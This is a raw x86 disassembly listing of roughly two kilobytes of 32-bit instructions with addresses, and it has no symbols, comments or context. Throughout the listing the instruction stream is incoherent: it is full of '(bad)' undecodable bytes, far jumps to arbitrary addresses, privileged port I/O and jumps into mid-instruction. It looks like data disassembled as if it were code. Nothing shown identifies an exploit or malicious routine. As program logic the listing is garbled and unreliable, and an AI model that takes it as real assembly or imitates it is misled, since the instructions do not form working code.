  4032ab:	mov    dl,0x9f
  4032ad:	mov    dh,0x98
  4032af:	retf   
  4032b0:	mov    al,ds:0xebc40f5
  4032b5:	(bad)  
  4032b6:	and    al,0x66
  4032b8:	arpl   WORD PTR [edi-0x37],dx
  4032bb:	test   eax,0xe1d52346
  4032c0:	jmp    0x6faf:0xd69b19ef
  4032c7:	or     dl,bh
  4032c9:	push   es
  4032ca:	in     al,dx
  4032cb:	add    bl,BYTE PTR [ebx+0x547830e2]
  4032d1:	cmp    BYTE PTR [ebp+edx*4-0x6563a7c4],dh
  4032d8:	test   al,0x89
  4032da:	or     ecx,DWORD PTR [ebx]
  4032dc:	ret    0xf513
  4032df:	out    0x72,eax
  4032e1:	adc    al,0x2d
  4032e3:	ror    BYTE PTR [esi],1
  4032e5:	mov    edi,0xf009dd4c
  4032ea:	sbb    DWORD PTR ds:0xc46f243,0x822711fa
  4032f4:	loope  0x4032f0
  4032f6:	repz and al,ah
  4032f9:	sub    BYTE PTR [eax-0x15f7f823],ah
  4032ff:	pop    ss
  403300:	sti    
  403301:	repz inc ebx
  403303:	in     al,dx
  403304:	or     al,0x9c
  403306:	mov    al,0x8f
  403308:	or     eax,0x7ded0b21
  40330d:	hlt    
  40330e:	sub    BYTE PTR [ecx],ah
  403310:	imul   ebp,esi,0xffffffdc
  403313:	mov    esi,0x55e884c5
  403318:	add    al,BYTE PTR [esi-0x302c5f5d]
  40331e:	xchg   edi,eax
  40331f:	or     DWORD PTR [edi-0x492c9c1c],eax
  403325:	(bad)  
  403326:	push   edi
  403327:	xor    cl,dh
  403329:	xchg   ebp,eax
  40332a:	mov    ebp,DWORD PTR [edx-0x364fd8d7]
  403330:	pop    edi
  403331:	inc    ebp
  403332:	sbb    DWORD PTR [ebx-0xe],esp
  403335:	sub    eax,DWORD PTR [ecx]
  403337:	(bad)  
  403338:	sbb    eax,0x9eff72a1
  40333d:	pusha  
  40333e:	jmp    0xbea4:0xafb59930
  403345:	out    0x46,eax
  403347:	ds test esi,edi
  40334a:	fmul   st(3),st
  40334c:	add    al,0x82
  40334e:	loopne 0x403353
  403350:	jle    0x40331b
  403352:	mov    ebp,0x469c8cb9
  403357:	jnp    0x4032e3
  403359:	(bad)  
  40335a:	stos   BYTE PTR es:[edi],al
  40335b:	enter  0x1a8a,0x28
  40335f:	sahf   
  403360:	xor    edx,eax
  403362:	test   DWORD PTR [esi],esi
  403364:	xchg   ebp,eax
  403365:	push   ebp
  403366:	test   eax,0x12687ce5
  40336b:	mov    WORD PTR [edx-0x9],fs
  40336e:	gs pop ss
  403370:	inc    ebx
  403371:	jbe    0x403315
  403373:	add    DWORD PTR [ecx],0xffffffe9
  403376:	pop    esp
  403377:	push   ebp
  403378:	jmp    0x929ab392
  40337d:	call   0x38217717
  403382:	or     eax,0x72ec63a9
  403387:	clc    
  403388:	jno    0x403363
  40338a:	sar    DWORD PTR [esp+ebp*8],cl
  40338d:	das    
  40338e:	(bad)  
  40338f:	sub    esp,DWORD PTR [ebx-0x80]
  403392:	test   BYTE PTR [ebx+0x2],ah
  403395:	cmp    BYTE PTR [edi],0x6e
  403398:	xchg   edx,eax
  403399:	or     eax,0x8616fd5d
  40339e:	inc    ebx
  40339f:	sbb    BYTE PTR [ecx],ch
  4033a1:	push   edx
  4033a2:	sub    ebp,ebp
  4033a4:	leave  
  4033a5:	jnp    0x4033f4
  4033a7:	leave  
  4033a8:	or     esp,0x110ff6f
  4033ae:	daa    
  4033af:	neg    ah
  4033b1:	mov    dh,0x1b
  4033b3:	lock dec ebp
  4033b6:	test   eax,0xb27801e8
  4033bb:	sar    DWORD PTR [esi-0x1c9b8e47],0x20
  4033c2:	js     0x4033e2
  4033c4:	mov    ebp,0xd970c9c3
  4033c9:	ja     0x4033d0
  4033cb:	fild   QWORD PTR [esi-0x51]
  4033ce:	neg    DWORD PTR [ebx+0x50c12b94]
  4033d4:	aad    0x95
  4033d6:	imul   edi,DWORD PTR [edx+edi*8+0x3],0xfa1a694b
  4033de:	or     DWORD PTR [ebx+0x10f50e6a],esp
  4033e4:	and    dl,cl
  4033e6:	(bad)  
  4033e7:	jmp    0x4c26:0x118a3608
  4033ee:	push   ebp
  4033ef:	in     eax,0x10
  4033f1:	sbb    al,0x9
  4033f3:	lea    eax,[ecx-0x7ea246de]
  4033f9:	clc    
  4033fa:	ret    0x7d0d
  4033fd:	enter  0xc94f,0xbc
  403401:	repz xor eax,0x39990078
  403407:	xchg   DWORD PTR [eax],esi
  403409:	test   BYTE PTR [ebp+0x3db7f631],ch
  40340f:	repz xor ebx,eax
  403412:	adc    ch,BYTE PTR [esp+esi*8+0x61]
  403416:	out    0xcb,eax
  403418:	retf   0xd7
  40341b:	add    al,BYTE PTR [edi-0x239c9f29]
  403421:	cmp    BYTE PTR [eax],bl
  403423:	aam    0x12
  403425:	pop    ecx
  403426:	mov    dh,0x34
  403428:	les    esp,FWORD PTR [esi]
  40342a:	mov    ebx,DWORD PTR [esi-0x4d]
  40342d:	jg     0x4033f1
  40342f:	ficom  WORD PTR [ebx+0x20]
  403432:	shrd   edx,esp,cl
  403435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403436:	in     al,dx
  403437:	xor    ecx,DWORD PTR [edx+eiz*4+0x641b8796]
  40343e:	std    
  40343f:	(bad)  
  403440:	je     0x403486
  403442:	inc    edx
  403443:	int3   
  403444:	ret    
  403445:	call   0x715d94c4
  40344a:	or     edi,DWORD PTR [edi+0x3b]
  40344d:	outs   dx,BYTE PTR ss:[esi]
  40344f:	gs aad 0x54
  403452:	cld    
  403453:	aam    0x93
  403455:	in     eax,dx
  403456:	mov    ecx,DWORD PTR [edx-0x5cff901f]
  40345c:	ja     0x4034cb
  40345e:	adc    DWORD PTR [esp+edi*4-0x15e356b6],0x4a824586
  403469:	mov    ebx,0x6b369eef
  40346f:	push   esi
  403470:	push   0x6cebde33
  403475:	jg     0x403475
  403477:	pop    edx
  403478:	sub    ebp,DWORD PTR ds:0x26c763ef
  40347e:	data16 es aad 0x1a
  403482:	jmp    0x1b18ca58
  403487:	or     esi,ebp
  403489:	test   esi,edi
  40348b:	and    ecx,esp
  40348d:	sbb    DWORD PTR [esp+ebp*2-0x58],ebx
  403491:	mov    BYTE PTR [esi],ah
  403493:	push   0x11679a54
  403498:	jo     0x403503
  40349a:	aaa    
  40349b:	arpl   WORD PTR [edi],bx
  40349d:	(bad)  
  4034a1:	sbb    ebp,esi
  4034a3:	mov    al,0x17
  4034a5:	add    eax,0xc7c3f93f
  4034aa:	daa    
  4034ab:	inc    eax
  4034ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034ad:	icebp  
  4034ae:	or     al,0x79
  4034b0:	push   ebp
  4034b1:	sti    
  4034b2:	call   0x5cf0770f
  4034b7:	push   ds
  4034b8:	(bad)  
  4034b9:	xor    cl,ch
  4034bb:	and    edx,DWORD PTR ds:0x4e09749d
  4034c1:	jge    0x4034ec
  4034c3:	jecxz  0x4034f5
  4034c5:	in     eax,0x99
  4034c7:	(bad)  
  4034c8:	clc    
  4034c9:	mov    WORD PTR ds:0x8ceb83fb,es
  4034cf:	mov    ecx,0x27e8c4d9
  4034d4:	or     cl,BYTE PTR [esi]
  4034d6:	fdivr  QWORD PTR [esi+0x77]
  4034d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034da:	dec    ecx
  4034db:	or     al,0xa3
  4034dd:	jmp    0x403476
  4034df:	or     edi,DWORD PTR [eax-0x28]
  4034e2:	sahf   
  4034e3:	push   ebp
  4034e4:	ret    0xe0c4
  4034e7:	pop    ebp
  4034e8:	popf   
  4034e9:	sub    edx,DWORD PTR [edx+0x68]
  4034ec:	inc    ebp
  4034ed:	jmp    0x39d2:0xc11e4cd0
  4034f4:	mov    dl,bh
  4034f6:	dec    esp
  4034f7:	fdivr  st,st(0)
  4034fa:	sub    DWORD PTR [esi-0x5],ebp
  4034fd:	mov    dh,0xf0
  4034ff:	mov    eax,0x9beec81d
  403504:	fisttp QWORD PTR cs:[ecx-0x8]
  403508:	out    0x11,eax
  40350a:	jp     0x4034d2
  40350c:	stos   BYTE PTR es:[edi],al
  40350d:	repnz sbb ch,BYTE PTR [eax+0x52a601ec]
  403514:	iret   
  403515:	(bad)  
  403517:	ret    0xeef8
  40351a:	scas   al,BYTE PTR es:[edi]
  40351b:	dec    ebp
  40351c:	jne    0x4034ba
  40351e:	in     eax,0x58
  403520:	aaa    
  403521:	retf   0x9a8e
  403524:	adc    DWORD PTR [ecx+0x5da9e4fb],ebx
  40352a:	cmp    edi,edx
  40352c:	or     DWORD PTR [edx],0xffffffa4
  40352f:	jp     0x403547
  403531:	jmp    0xc40b0f15
  403536:	adc    al,0x87
  403538:	(bad)  
  403539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40353a:	loop   0x40351e
  40353c:	pop    ebx
  40353d:	rcl    BYTE PTR [edx+ecx*2],0xc2
  403541:	ss dec esp
  403543:	pop    eax
  403544:	test   dl,al
  403546:	sub    cl,BYTE PTR [edi]
  403548:	xor    ecx,DWORD PTR [eax-0xcd8be34]
  40354e:	or     cl,BYTE PTR [ecx-0x30]
  403551:	or     DWORD PTR [ebp+0x25],ebp
  403554:	paddq  mm3,mm5
  403557:	inc    esp
  403558:	in     al,0x1b
  40355a:	jo     0x403590
  40355c:	es adc al,0x67
  40355f:	pop    ss
  403560:	xchg   ebx,eax
  403561:	xor    esi,DWORD PTR [edi]
  403563:	pop    eax
  403564:	xor    eax,0xdb0b3aeb
  403569:	sub    ch,BYTE PTR [eax+0x6bb0ae9d]
  40356f:	enter  0xc381,0xf6
  403573:	scas   eax,DWORD PTR es:[edi]
  403574:	in     eax,dx
  403575:	ins    DWORD PTR es:[edi],dx
  403576:	sbb    bl,BYTE PTR [edx]
  403578:	es arpl bx,cx
  40357b:	and    BYTE PTR [esi],ah
  40357d:	and    eax,0x195776f8
  403582:	xchg   esi,eax
  403583:	stos   DWORD PTR es:[edi],eax
  403584:	lods   eax,DWORD PTR ds:[esi]
  403585:	fbstp  TBYTE PTR ds:0x6fad7013
  40358b:	xchg   ecx,eax
  40358c:	xchg   esp,eax
  40358d:	ret    0x5ba5
  403590:	gs xor ebp,ecx
  403593:	jl     0x403605
  403595:	add    BYTE PTR [ecx-0x17f44a9],dh
  40359b:	cmp    eax,DWORD PTR [ebp+0x14e60f78]
  4035a1:	in     al,dx
  4035a2:	xchg   BYTE PTR [edx],cl
  4035a4:	xchg   esi,eax
  4035a5:	adc    DWORD PTR [ebp-0x23f82c02],esp
  4035ab:	cmp    eax,0xa4700e10
  4035b0:	hlt    
  4035b1:	adc    BYTE PTR [esp+ecx*4-0x63ed6a87],0x40
  4035b9:	enter  0x2330,0x27
  4035bd:	dec    eax
  4035be:	pop    ss
  4035bf:	shl    DWORD PTR [edi+ebx*2],0x17
  4035c3:	nop
  4035c4:	stos   DWORD PTR es:[edi],eax
  4035c5:	shl    ebx,0xcc
  4035c8:	mov    edx,0x6b4f032b
  4035cd:	outs   dx,DWORD PTR ds:[esi]
  4035ce:	es iret 
  4035d0:	cli    
  4035d1:	adc    ch,ch
  4035d3:	int3   
  4035d4:	ins    BYTE PTR es:[edi],dx
  4035d5:	xchg   edi,eax
  4035d6:	call   edx
  4035d8:	add    eax,0xf45a7934
  4035dd:	call   0x2b0fb439
  4035e2:	sbb    DWORD PTR [ebp-0x57],ecx
  4035e5:	mov    ah,0x3b
  4035e7:	mov    ebx,ebx
  4035e9:	or     BYTE PTR [edi],al
  4035eb:	(bad)  
  4035ed:	test   eax,0xcae70b4e
  4035f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035f3:	ret    0x5f50
  4035f6:	mov    ds:0xdfce312f,al
  4035fb:	shl    DWORD PTR [ecx+0x1219c3be],0x19
  403602:	(bad)  
  403604:	lods   al,BYTE PTR ds:[esi]
  403605:	or     DWORD PTR [edi-0x26],0xffffffe2
  403609:	(bad)  
  40360a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40360b:	xchg   esi,eax
  40360c:	in     al,dx
  40360d:	sub    ecx,ebp
  40360f:	xchg   esi,eax
  403610:	pop    esp
  403611:	pushf  
  403612:	sbb    dl,BYTE PTR [esi]
  403614:	scas   eax,DWORD PTR es:[edi]
  403615:	call   0x82cc93a4
  40361a:	loope  0x403678
  40361c:	lds    eax,FWORD PTR [eax+edx*1]
  40361f:	add    BYTE PTR [esi],al
  403621:	cmp    DWORD PTR [esi+0x31],0x7d
  403625:	ret    0xbbc9
  403628:	out    dx,eax
  403629:	sbb    DWORD PTR [ecx+eiz*8-0x345a47f8],0xfa8a60e5
  403634:	mov    eax,0x44afa827
  403639:	arpl   WORD PTR [ebp+0x66e9470d],di
  40363f:	pop    ss
  403640:	lea    ebp,[esi-0x61]
  403643:	imul   esi,DWORD PTR [edx-0x7e],0x36
  403647:	jb     0x40364b
  403649:	pusha  
  40364a:	popa   
  40364b:	cli    
  40364c:	add    DWORD PTR [esi-0x50e67956],eax
  403652:	mov    eax,ds:0x111db837
  403657:	mov    dh,0x76
  403659:	ja     0x40364d
  40365b:	call   DWORD PTR [eax-0x57a0c732]
  403661:	icebp  
  403662:	push   ebp
  403663:	jns    0x4035fe
  403665:	sbb    edx,DWORD PTR [eax+0x5c]
  403668:	popa   
  403669:	imul   esi,DWORD PTR [edi+0x2b],0x3c
  40366d:	shl    DWORD PTR ds:0xfb2c7c09,cl
  403673:	jecxz  0x4036ee
  403675:	dec    esi
  403676:	pop    ecx
  403677:	cmc    
  403678:	jnp    0x40362c
  40367a:	nop
  40367b:	sbb    cl,al
  40367d:	add    al,BYTE PTR [ecx+0x1d]
  403680:	sub    BYTE PTR [ebx+0x5b],bl
  403683:	fdivr  DWORD PTR [ebx]
  403685:	pusha  
  403686:	rep lods eax,DWORD PTR ds:[esi]
  403688:	mov    al,ds:0x50754fd8
  40368d:	sbb    edx,DWORD PTR [ecx]
  40368f:	(bad)  
  403690:	mov    ebx,0x5f91d034
  403695:	(bad)  
  403696:	je     0x403703
  403698:	das    
  403699:	(bad)  
  40369a:	in     eax,dx
  40369b:	data16 mov ?,WORD PTR [ecx-0x10]
  40369f:	pop    esi
  4036a0:	test   al,0x31
  4036a2:	sbb    eax,0x5ed300b6
  4036a7:	jo     0x403721
  4036a9:	mov    ebx,0x8bce2475
  4036ae:	push   edi
  4036af:	and    al,0x22
  4036b1:	sti    
  4036b2:	sub    DWORD PTR [ebx-0x5c8839f3],0x1ecbac42
  4036bc:	jno    0x40371b
  4036be:	ins    DWORD PTR es:[edi],dx
  4036bf:	or     ah,BYTE PTR [edx+0x16b77b49]
  4036c5:	aam    0x30
  4036c7:	arpl   sp,bx
  4036c9:	jbe    0x4036cf
  4036cb:	adc    dl,BYTE PTR [ebx]
  4036cd:	add    DWORD PTR [esp+edi*8+0x23],eax
  4036d1:	test   al,0x4b
  4036d3:	lods   eax,DWORD PTR ds:[esi]
  4036d4:	sbb    eax,0x70b264a3
  4036d9:	leave  
  4036da:	adc    bl,BYTE PTR [eax+0x49eb33ec]
  4036e0:	into   
  4036e1:	sub    al,0x1c
  4036e3:	mov    ss,WORD PTR [esi-0x53876c0e]
  4036e9:	inc    esi
  4036ea:	mov    esp,0xd1fb3634
  4036ef:	jmp    0x4036f0
  4036f1:	fisub  WORD PTR [ecx-0x16]
  4036f4:	mov    bh,0x8
  4036f6:	or     eax,0xa366f554
  4036fb:	mov    dl,0x75
  4036fd:	sbb    ch,BYTE PTR [edi+0x46]
  403700:	pusha  
  403701:	lahf   
  403702:	pop    ebx
  403703:	push   0x26
  403705:	pop    ebp
  403706:	sub    DWORD PTR [eax-0x57],esi
  403709:	inc    edi
  40370a:	push   ebx
  40370b:	fmul   QWORD PTR [edi]
  40370d:	xchg   esp,eax
  40370e:	call   0xc2d54e0d
  403713:	push   0xffffffc0
  403715:	sub    cl,al
  403717:	stos   BYTE PTR es:[edi],al
  403718:	sbb    al,0xdb
  40371a:	hlt    
  40371b:	(bad)  
  40371c:	mov    BYTE PTR [esi-0x58],ch
  40371f:	mov    eax,0x6f8c3242
  403724:	add    DWORD PTR [edx],edx
  403726:	in     eax,dx
  403727:	sub    eax,0x2534421e
  40372c:	inc    ecx
  40372d:	jp     0x403727
  40372f:	mov    dh,0x15
  403731:	cmp    al,0xde
  403733:	mov    bh,0x99
  403735:	ja     0x403779
  403737:	and    eax,0x260cc581
  40373c:	dec    edx
  40373d:	jo     0x4037b3
  40373f:	jae    0x403784
  403741:	cmp    al,0x2c
  403743:	mov    eax,0xca54dc66
  403748:	ins    BYTE PTR es:[edi],dx
  403749:	retf   
  40374a:	retf   0x4e65
  40374d:	adc    esp,esi
  40374f:	imul   ebx,DWORD PTR [ecx-0x6779ab52],0xffffff86
  403756:	cmc    
  403757:	lds    ecx,FWORD PTR [ecx+0x17]
  40375a:	popa   
  40375b:	jno    0x403707
  40375d:	repz and edx,esi
  403760:	loope  0x40372f
  403762:	lods   al,BYTE PTR ds:[esi]
  403763:	in     eax,0x57
  403765:	sub    al,0x26
  403767:	cmc    
  403768:	sti    
  403769:	mov    WORD PTR [edx+0x217de17f],fs
  40376f:	push   esi
  403770:	push   0x12da7a2a
  403775:	add    edx,edx
  403777:	xchg   ebp,eax
  403778:	mov    cl,0xb2
  40377a:	ds pop edi
  40377c:	xchg   esp,eax
  40377d:	jmp    0x403741
  40377f:	inc    esi
  403780:	sbb    BYTE PTR [ebp+0x66],al
  403783:	cwde   
  403784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403785:	test   eax,0x60cccc1
  40378a:	retf   
  40378b:	popa   
  40378c:	inc    ebx
  40378d:	fst    QWORD PTR ss:[edi]
  403790:	pop    edi
  403791:	imul   ebx,esp,0xffffffdb
  403794:	sbb    al,0xbf
  403796:	call   0x2f7a90fd
  40379b:	pop    ecx
  40379c:	push   0x52
  40379e:	or     BYTE PTR [edi-0xa],0xf3
  4037a2:	stc    
  4037a3:	add    DWORD PTR [edx],ebp
  4037a5:	and    esi,DWORD PTR [edi+0x19]
  4037a8:	and    ch,BYTE PTR [bp+si]
  4037ab:	jge    0x403743
  4037ad:	into   
  4037ae:	pop    esi
  4037af:	sbb    eax,0xee268ffc
  4037b4:	push   ds
  4037b5:	cmc    
  4037b6:	call   0xd34b:0xbb3a45da
  4037bd:	xchg   esp,eax
  4037be:	leave  
  4037bf:	mov    dl,0xb6
  4037c1:	rcr    BYTE PTR [eax-0x32],cl
  4037c4:	std    
  4037c5:	bound  ecx,QWORD PTR [edi]
  4037c7:	sbb    eax,0xcf71e1a0
  4037cc:	dec    ebp
  4037cd:	not    BYTE PTR [esi-0xb433905]
  4037d3:	daa    
  4037d4:	jne    0x4037c6
  4037d6:	rcl    DWORD PTR [ebx+ebp*1],cl
  4037d9:	mov    edx,0x4da137ec
  4037de:	fisubr DWORD PTR [ebx]
  4037e0:	mov    ebx,0x765b1cb9
  4037e5:	jo     0x403822
  4037e7:	push   ss
  4037e8:	mov    dh,0x91
  4037ea:	jmp    0xf9422fc2
  4037ef:	xchg   ecx,eax
  4037f0:	xchg   dh,dh
  4037f2:	xor    al,0x76
  4037f4:	rol    esi,cl
  4037f6:	dec    eax
  4037f7:	sbb    bl,ch
  4037f9:	jge    0x403787
  4037fb:	or     al,0x6c
  4037fd:	outs   dx,DWORD PTR ds:[esi]
  4037fe:	or     ch,BYTE PTR [eax]
  403800:	popa   
  403801:	jle    0x403860
  403803:	outs   dx,DWORD PTR ds:[esi]
  403804:	and    eax,0x4d7be569
  403809:	ins    BYTE PTR es:[edi],dx
  40380a:	lods   al,BYTE PTR ds:[esi]
  40380b:	push   ebp
  40380c:	mov    BYTE PTR [ebp+0x23],dh
  40380f:	inc    ecx
  403810:	into   
  403811:	xor    eax,0x34971de7
  403816:	ins    DWORD PTR es:[edi],dx
  403817:	sti    
  403818:	fsubrp st(2),st
  40381a:	sbb    dh,ah
  40381c:	add    DWORD PTR [ecx-0x1170f227],ecx
  403822:	sar    dl,0x59
  403825:	ret    
  403826:	jae    0x4037d3
  403828:	lock mov al,0xcb
  40382b:	mov    ch,0x5c
  40382d:	xor    dl,ah
  40382f:	adc    esp,edi
  403831:	cdq    
  403832:	pop    esp
  403833:	mov    dh,0xb9
  403835:	and    DWORD PTR [edi+0x1b],0xee8b58f4
  40383c:	cld    
  40383d:	pushf  
  40383e:	orps   xmm1,XMMWORD PTR [eax]
  403841:	and    ecx,DWORD PTR [edx]
  403843:	pop    esp
  403844:	cmp    edx,DWORD PTR gs:[edi+0x62]
  403848:	inc    ecx
  403849:	imul   ebx,DWORD PTR [edx+ebp*2-0x179a595b],0xffffff85
  403851:	rcl    DWORD PTR [edi],1
  403853:	dec    ebx
  403854:	mov    dh,0x27
  403856:	lock cmp esp,DWORD PTR [ebx-0x21]
  40385a:	outs   dx,DWORD PTR ds:[esi]
  40385b:	test   eax,0xd2621abe
  403860:	jp     0x403860
  403862:	dec    ecx
  403863:	or     eax,0x3bd9c2a2
  403868:	pop    esp
  403869:	icebp  
  40386a:	push   0x154c9f5e
  40386f:	sbb    ebp,DWORD PTR [ebp-0x11]
  403872:	setg   BYTE PTR [ebp-0x6526c845]
  403879:	shl    DWORD PTR gs:[ebp-0x74],cl
  40387d:	out    dx,eax
  40387e:	ins    DWORD PTR es:[edi],dx
  40387f:	mov    bp,0x4cd
  403883:	mov    ds:0x5e5edcec,eax
  403888:	inc    edi
  403889:	jecxz  0x403884
  40388b:	les    ecx,FWORD PTR [edi+eax*8]
  40388e:	lock mov al,0xbe
  403891:	ins    DWORD PTR es:[edi],dx
  403892:	loope  0x40381b
  403894:	sub    dl,BYTE PTR [ebx+0x1143437a]
  40389a:	jg     0x40388b
  40389c:	xor    al,0x52
  40389e:	ins    BYTE PTR es:[edi],dx
  40389f:	outs   dx,BYTE PTR ds:[esi]
  4038a0:	imul   esp,DWORD PTR [edi+edi*1-0x31339fe],0x72
  4038a8:	aad    0x32
  4038aa:	jbe    0x40383a
  4038ac:	push   ss
  4038ad:	test   BYTE PTR [ebp-0x55],dh
  4038b0:	mov    WORD PTR [ecx],?
  4038b2:	pop    ebp
  4038b3:	push   0x71083eba
  4038b8:	test   edx,ecx
  4038ba:	pop    eax
  4038bb:	out    0x11,al
  4038bd:	xor    edi,DWORD PTR [ebp+edx*4-0x7915e1d5]
  4038c4:	or     BYTE PTR [edi],cl
  4038c6:	mov    bl,dh
  4038c8:	inc    edi
  4038c9:	(bad)  
  4038ca:	pop    esi
  4038cb:	jnp    0x4038a4
  4038cd:	xor    al,0x29
  4038cf:	mov    ecx,0x52012c2d
  4038d4:	push   esi
  4038d5:	sub    eax,0x4b7d5554
  4038da:	retf   
  4038db:	xchg   edx,eax
  4038dc:	pop    es
  4038dd:	sahf   
  4038de:	fwait
  4038df:	(bad)  
  4038e0:	fistp  WORD PTR [ebx+0x50ee2f5]
  4038e6:	pop    ecx
  4038e7:	xchg   edi,eax
  4038e8:	out    dx,al
  4038e9:	pop    ecx
  4038ea:	rcl    DWORD PTR [eax+0x4],cl
  4038ed:	xchg   edx,eax
  4038ee:	(bad)  
  4038ef:	fimul  DWORD PTR [edi+0x67836ca7]
  4038f5:	lods   al,BYTE PTR ds:[esi]
  4038f6:	aaa    
  4038f7:	lahf   
  4038f8:	inc    ebp
  4038f9:	sbb    cl,BYTE PTR [ebx]
  4038fb:	and    edx,DWORD PTR [esi+0x74529758]
  403901:	xchg   BYTE PTR [edx+0x77],bh
  403904:	sahf   
  403905:	sbb    dl,bl
  403907:	fimul  DWORD PTR [edi-0x41]
  40390a:	and    al,0x46
  40390c:	icebp  
  40390d:	inc    ebx
  40390e:	mov    ebp,0x38ff8f60
  403913:	ficom  WORD PTR [ecx]
  403915:	jns    0x4038c6
  403917:	jge    0x4038b5
  403919:	push   ebx
  40391a:	fisub  DWORD PTR [ebx-0x2f9a0713]
  403920:	xor    eax,0x2347d4
  403925:	cmp    BYTE PTR [edi+edx*2],0xef
  403929:	or     DWORD PTR [esi+0x65],esi
  40392c:	sbb    esi,ebp
  40392e:	jo     0x4039a7
  403930:	mov    edi,0x943c0687
  403935:	out    0x43,al
  403937:	call   0xe99f926f
  40393c:	or     BYTE PTR [eax-0x31],bh
  40393f:	int    0xa3
  403941:	jp     0x403983
  403943:	cli    
  403944:	jmp    0x4039a0
  403946:	stos   BYTE PTR es:[edi],al
  403947:	ret    
  403948:	jnp    0x4038fb
  40394a:	cld    
  40394b:	test   DWORD PTR [eax+0x43e6b959],edx
  403951:	xchg   esp,eax
  403952:	push   0x5d
  403954:	in     eax,dx
  403955:	out    dx,eax
  403956:	dec    edi
  403957:	mov    edi,0xe197b1b3
  40395c:	js     0x40391d
  40395e:	pop    edi
  40395f:	fsubp  st(6),st
  403961:	mov    ch,0xff
  403963:	(bad)  
  403964:	push   ss
  403965:	pop    ebp
  403966:	je     0x40396b
  403968:	rcl    BYTE PTR [edi],cl
  40396a:	push   ebp
  40396b:	fidivr WORD PTR [ebx-0x70]
  40396e:	fiadd  WORD PTR [esp+edx*8]
  403971:	jmp    0x8623:0xa36cddea
  403978:	fstp   DWORD PTR [esi+0xf]
  40397b:	sbb    ch,bl
  40397d:	int    0x82
  40397f:	fs inc edx
  403981:	shl    DWORD PTR [eax-0x5],1
  403984:	dec    esi
  403985:	xchg   ecx,eax
  403986:	xor    edx,DWORD PTR [esi-0x25c6c8e4]
  40398c:	jp     0x4039b7
  40398e:	cmp    BYTE PTR [edx],0xa1
  403991:	sar    BYTE PTR [esp+ebp*4+0x5b39f4f9],0x7e
  403999:	xor    BYTE PTR [eax],al
  40399b:	pop    ss
  40399c:	lahf   
  40399d:	cs out dx,al
  40399f:	jl     0x403983
  4039a1:	adc    bl,dh
  4039a3:	test   BYTE PTR [ecx+esi*8-0x5],dh
  4039a7:	rcr    DWORD PTR [edx+ebp*1],1
  4039aa:	adc    al,0xaa
  4039ac:	std    
  4039ad:	loop   0x403a12
  4039af:	ds adc bh,ah
  4039b2:	and    al,0xb5
  4039b4:	shr    DWORD PTR [ebp+0x1f],cl
  4039b7:	call   0x88941b78
  4039bc:	(bad)  
  4039bd:	ffree  st(4)
  4039bf:	jl     0x40394c
  4039c1:	or     DWORD PTR [ebp-0x5f95cdcf],edi
  4039c7:	dec    ebp
  4039c8:	and    BYTE PTR [ecx-0x6d],cl
  4039cb:	inc    edi
  4039cc:	jecxz  0x403950
  4039ce:	ret    
  4039cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039d0:	outs   dx,DWORD PTR ds:[esi]
  4039d1:	lea    edx,[esi+0x3]
  4039d4:	pusha  
  4039d5:	mov    ah,0x9c
  4039d7:	mov    ah,dl
  4039d9:	gs push esp
  4039db:	cmp    DWORD PTR [eax],ebx
  4039dd:	mov    BYTE PTR [edx+0x2073a4ed],ch
  4039e3:	das    
  4039e4:	mov    edx,0x7ee60a03
  4039e9:	je     0x4039d7
  4039eb:	imul   al
  4039ed:	pop    esi
  4039ee:	aad    0x46
  4039f0:	add    BYTE PTR [esi+0x1f7b282b],al
  4039f6:	std    
  4039f7:	adc    al,ch
  4039f9:	xor    BYTE PTR [esp+ecx*1],bl
  4039fc:	add    BYTE PTR [ebx+0x4b45e387],bl
  403a02:	retf   
  403a03:	add    al,0xc3
  403a05:	aaa    
  403a06:	dec    edi
  403a07:	retf   0x6151
  403a0a:	inc    ecx
  403a0b:	cmp    eax,0x1ec2eecc
  403a10:	add    edx,edx
  403a12:	or     cl,dl
  403a14:	jmp    0x403a14
  403a16:	adc    dh,BYTE PTR [eax+0x797f041e]
  403a1c:	outs   dx,DWORD PTR ds:[esi]
  403a1d:	sbb    DWORD PTR [esp+edi*1+0x48],edx
  403a21:	ret    0x62a9
  403a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a25:	int    0x0
  403a27:	fidiv  DWORD PTR [edi+0x394d1f41]
  403a2d:	ror    BYTE PTR [edx+0x38],0x5c
  403a31:	adc    ecx,ecx
  403a33:	inc    ebx
  403a34:	and    edx,edx
  403a36:	fild   QWORD PTR fs:[ecx+0x1a21ba32]
  403a3d:	pop    es
  403a3e:	ror    cl,cl
  403a40:	xor    al,0x16
  403a42:	fisttp QWORD PTR ds:0x278eaa64
  403a48:	xlat   BYTE PTR ds:[ebx]
  403a49:	mov    ecx,0x3c9efea5
  403a4e:	adc    esi,edi
  403a50:	sub    eax,0xd0dea697
  403a55:	xchg   edx,eax
  403a56:	cmp    bh,BYTE PTR ds:[esi]
  403a59:	fimul  WORD PTR [ebx+0x14]
  403a5c:	jmp    0x34aa:0xf322905e
  403a63:	pusha  
  403a64:	in     eax,dx
  403a65:	loopne 0x403a70
  403a67:	test   eax,0xa5d2afb2
  403a6c:	outs   dx,DWORD PTR ds:[esi]
  403a6d:	jg     0x403aae
  403a6f:	mov    edi,0x35fa2dea
  403a74:	or     DWORD PTR [ebp-0x227ab86],0x153ae6d4
  403a7e:	mov    ch,0x60
  403a80:	in     al,0xc2
  403a82:	inc    eax
  403a83:	bound  esp,QWORD PTR [edx-0x80]
  403a86:	xchg   ebx,eax
  403a87:	xchg   ebp,eax
  403a88:	dec    ebx
  403a89:	pop    esp
  403a8a:	(bad)
  403a8d:	add    BYTE PTR [edi-0x69],dl
  403a90:	jnp    0x403ac4
  403a92:	les    ecx,FWORD PTR [esi-0x369ba52a]
  403a98:	mov    bh,0x43
  403a9a:	push   edi
  403a9b:	pop    eax
  403a9c:	add    DWORD PTR [ebx],0x9628494c
  403aa2:	jmp    FWORD PTR [ebx+0x310204cf]
  403aa8:	or     DWORD PTR [edi-0x670ca6bb],ebp
  403aae:	les    esi,FWORD PTR [ebx+0xc]
